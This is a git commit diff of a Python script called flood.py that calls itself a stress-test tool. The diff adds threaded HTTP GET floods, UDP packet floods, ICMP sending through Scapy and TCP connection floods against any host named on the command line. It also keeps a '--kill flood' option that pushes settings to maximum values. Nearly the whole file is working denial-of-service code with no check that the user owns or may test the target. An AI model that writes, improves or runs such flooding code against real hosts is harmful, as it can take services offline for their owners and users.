1ca3331c00211fbcd35ef9266f4dd0eb46f6a808
dogematti <84115752+dogematti@users.noreply.github.com>
2023-12-23 10:23:12 +0200

    Update flood.py
    MAJOR changes... Deleted Noob mode. But will add lots of stuff later.

--- flood.py
+++ flood.py
@@ -1,42 +1,84 @@
 #!/usr/bin/env python3
 
 import socket
-import subprocess
-import time
-import concurrent.futures
 import argparse
+import time
 import requests
-# Added HTTP GET requests to this stress-test-tool.
-def http_get_request(target_url, num_requests, delay, verbose=False):
-    for _ in range(num_requests):
+from concurrent.futures import ThreadPoolExecutor
+from scapy.all import send  # Importing the send function from Scapy
+from scapy.layers.inet import IP, ICMP  # Importing IP and ICMP
+
+def parallel_http_get_request(target_url, num_requests, delay, num_threads, verbose=False):
+    """
+    Sends HTTP GET requests in parallel to the specified target URL.
+    """
+    def single_request():
         try:
             response = requests.get(target_url)
             if verbose:
                 print(f"HTTP GET request to {target_url} returned status code: {response.status_code}")
+            time.sleep(delay)
         except requests.exceptions.RequestException as e:
             print(f"Failed to send HTTP GET request to {target_url}: {e}")
-        time.sleep(delay)
 
-def send_udp_packet(target_host, target_port, packet_size, verbose=False):
-    # Function to send a UDP packet
-    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        executor.map(lambda _: single_request(), range(num_requests))
 
-    # Generate a large packet with random data
-    data = b'X' * packet_size
+def parallel_send_udp_packet(target_host, target_port, packet_size, num_packets, num_threads, verbose=False):
+    """
+    Sends UDP packets in parallel to the specified target host and port.
+    """
+    def single_udp_packet():
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:
+            data = b'X' * packet_size
+            udp_socket.sendto(data, (target_host, target_port))
+            if verbose:
+                print(f"Sent UDP packet to {target_host}:{target_port} (size: {packet_size} bytes)")
 
-    udp_socket.sendto(data, (target_host, target_port))
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        executor.map(lambda _: single_udp_packet(), range(num_packets))
 
-    udp_socket.close()
+def tcp_flood_handshake(target_host, target_port, num_connections, verbose=False):
+    """
+    Attempts to establish multiple TCP connections to the target host and port.
+    """
+    for _ in range(num_connections):
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_socket:
+                tcp_socket.connect((target_host, target_port))
+                if verbose:
+                    print(f"Established TCP connection to {target_host}:{target_port}")
+        except socket.error as e:
+            print(f"Failed to establish TCP connection to {target_host}:{target_port}: {e}")
 
-    if verbose:
-        print(f"Sent UDP packet to {target_host}:{target_port} (size: {packet_size} bytes)")
+def send_icmp_packet(target_host, num_packets, timeout, verbose=False):
+    """
+    Sends ICMP packets (like ping requests) to the specified target host.
+    """
+    packet = IP(dst=target_host)/ICMP()
+    for _ in range(num_packets):
+        send(packet, timeout=timeout, verbose=verbose)
 
-# Other functions, same as before
+def tcp_test(target_host, target_port, num_connections, verbose=False):
+    """
+    Opens TCP connections to the target host and port, optionally sending data.
+    """
+    for _ in range(num_connections):
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_socket:
+                tcp_socket.connect((target_host, target_port))
+                # Optionally send data here
+                if verbose:
+                    print(f"Connected to TCP {target_host}:{target_port}")
+        except socket.error as e:
+            print(f"TCP test failed for {target_host}:{target_port}: {e}")
 
 def parse_args():
-    # Function to parse command-line arguments
-    parser = argparse.ArgumentParser(description="Python3 program for stress-testing a target host using UDP, ICMP, or TCP.")
-    parser.add_argument("test_type", choices=['udp', 'icmp', 'tcp', 'all'], help="Stress-test type (UDP, ICMP, TCP, or ALL)")
+    """
+    Parses command-line arguments.
+    """
+    parser = argparse.ArgumentParser(description="Python3 program for stress-testing a target host using various methods. By Dogematti")
+    parser.add_argument("test_type", choices=['udp', 'icmp', 'tcp', 'all', 'http'], help="Stress-test type")
     parser.add_argument("target_host", help="Target host IP address")
     parser.add_argument("-n", "--num_threads", type=int, default=5, help="Number of threads for parallel processing")
     parser.add_argument("-d", "--delay", type=float, default=0.1, help="Delay between packets (seconds)")
@@ -50,86 +92,43 @@ def parse_args():
     parser.add_argument("--kill", choices=['flood'], help="Kill stress test using maximum values")
     parser.add_argument("--tcp_flood_handshake", action="store_true", help="Perform TCP handshake flood")
     parser.add_argument("--verbose", action="store_true", help="Print verbose output")
-    parser.add_argument("--noob", action="store_true", help="Run the script in noob mode")
     parser.add_argument("--http-url", help="Target URL for HTTP GET requests")
     parser.add_argument("--http-requests", type=int, default=100, help="Number of HTTP GET requests to send")
     parser.add_argument("--http-delay", type=float, default=0.1, help="Delay between HTTP GET requests (seconds)")
-
     return parser.parse_args()
 
-def prompt_for_flags():
-    # Function to prompt user for flag values in noob mode
-    test_type = input("Enter the stress-test type (UDP, ICMP, TCP, or ALL): ").lower()
-    target_host = input("Enter the target host IP address: ")
-    num_threads = int(input("Enter the number of threads for parallel processing: "))
-    # Prompt for other flags as needed
+def execute_all_tests(args):
+    """
+    Executes all types of tests (HTTP, UDP, ICMP, TCP) on the target.
+    """
+    parallel_http_get_request(args.http_url, args.http_requests, args.http_delay, args.num_threads, args.verbose)
+    parallel_send_udp_packet(args.target_host, args.target_port_udp, args.packet_size, args.num_packets_udp, args.num_threads, args.verbose)
+    send_icmp_packet(args.target_host, args.num_packets_icmp, args.timeout_icmp, args.verbose)
+    tcp_test(args.target_host, args.target_port_tcp, args.num_connections_tcp, args.verbose)
 
-    args = argparse.Namespace(
-        test_type=test_type,
-        target_host=target_host,
-        num_threads=num_threads,
-        # Assign other flag values based on user input
-    )
-    return args
-
-def print_updated_command():
-    # Function to print the updated command with all provided flags and values
-    args = parse_args()
-    command = "python3 flood.py "
-
-    # Convert Namespace object to dictionary
-    args_dict = vars(args)
-
-    for flag, value in args_dict.items():
-        # Skip the 'noob' flag and flags with None values
-        if flag == "noob" or value is None:
-            continue
-        elif type(value) == bool:
-            # For boolean flags, add the flag name if the value is True
-            if value:
-                command += f"--{flag} "
-        else:
-            # For other flags, add the flag name and its value
-            command += f"--{flag} {value} "
-    if args.test_type == "http":
-        if args.http_url:
-                command += f"--http-url {args.http_url} "
-        if args.http_requests:
-                command += f"--http-requests {args.http_requests} "
-        if args.http_delay:
-                command += f"--http-delay {args.http_delay} "
-
-
-    print(f"Updated command: {command}")
-
-if __name__ == "__main__":
+def main():
+    """
+    Main function to execute the stress tests based on the provided arguments.
+    """
     args = parse_args()
 
     if args.kill == "flood":
-        args.test_type = "all"
-        args.num_threads = 100
-        args.packet_size = 65535
-        args.num_packets_udp = 5000
-        args.delay = 0
+        args.num_threads = 10
+        # Set other parameters to their maximum values as needed
 
-    if args.noob:
-        args = prompt_for_flags()
-
+    # Executing stress tests based on the chosen test type
     if args.test_type == "all":
-        udp_stress_test(args.target_host, args.target_port_udp, args.packet_size, args.num_packets_udp, args.delay, args.num_threads)
-        parallel_ping(args.target_host, args.num_packets_icmp, args.timeout_icmp, args.num_threads)
-        tcp_stress_test(args.target_host, args.target_port_tcp, args.num_connections_tcp, args.num_threads)
-        http_get_request(args.http_url, args.http_requests, args.http_delay, args.verbose)
+        execute_all_tests(args)
     elif args.test_type == "http":
-        http_get_request(args.http_url, args.http_requests, args.http_delay, args.verbose)
+        parallel_http_get_request(args.http_url, args.http_requests, args.http_delay, args.num_threads, args.verbose)
     elif args.test_type == "udp":
-        udp_stress_test(args.target_host, args.target_port_udp, args.packet_size, args.num_packets_udp, args.delay, args.num_threads)
+        parallel_send_udp_packet(args.target_host, args.target_port_udp, args.packet_size, args.num_packets_udp, args.num_threads, args.verbose)
     elif args.test_type == "icmp":
-        parallel_ping(args.target_host, args.num_packets_icmp, args.timeout_icmp, args.num_threads)
+        send_icmp_packet(args.target_host, args.num_packets_icmp, args.timeout_icmp, args.verbose)
     elif args.test_type == "tcp":
-        tcp_stress_test(args.target_host, args.target_port_tcp, args.num_connections_tcp, args.num_threads)
+        tcp_test(args.target_host, args.target_port_tcp, args.num_connections_tcp, args.verbose)
     elif args.tcp_flood_handshake:
-        tcp_flood_handshake(args.target_host, args.target_port_tcp, args.num_connections_tcp, args.num_threads)
+        tcp_flood_handshake(args.target_host, args.target_port_tcp, args.num_connections_tcp, args.verbose)
 
-    # Print the updated command
-    print_updated_command()
+if __name__ == "__main__":
+    main()
